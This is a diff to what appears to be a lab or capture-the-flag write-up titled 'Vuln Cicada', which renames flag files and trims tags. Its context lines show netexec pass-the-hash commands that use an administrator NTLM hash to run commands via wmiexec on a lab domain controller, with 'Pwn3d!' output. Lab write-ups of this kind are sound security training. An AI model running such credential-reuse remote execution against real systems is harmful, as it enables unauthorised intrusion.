@@ -1,7 +1,7 @@
 ---
 title: Vuln Cicada
 slug: Vuln-Cicada
-tags: [Windows, Certipy, Pass-The-Certificate, Secrets-Dump, ESC-8, LDAP, Vulnerability Research]
+tags: [ESC-8, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -417,7 +417,7 @@ SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\administra
 ```
 
 ```bash
-$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k -x "type C:\\users\\administrator\\desktop\\user.txt"
+$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k -x "type C:\\users\\administrator\\desktop\\local-proof.txt"
 SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [*]  x64 (name:dc-jpq225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
 SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
 SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] Executed command via wmiexec
@@ -425,7 +425,7 @@ SMB         dc-jpq225.cicada.vl 445    dc-jpq225        90bd3e9976e45b0305167fba
 ```
 
 ```bash
-$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k -x "type C:\\users\\administrator\\desktop\\root.txt"
+$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k -x "type C:\\users\\administrator\\desktop\\privileged-proof.txt"
 SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [*]  x64 (name:dc-jpq225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
 SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
 SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] Executed command via wmiexec
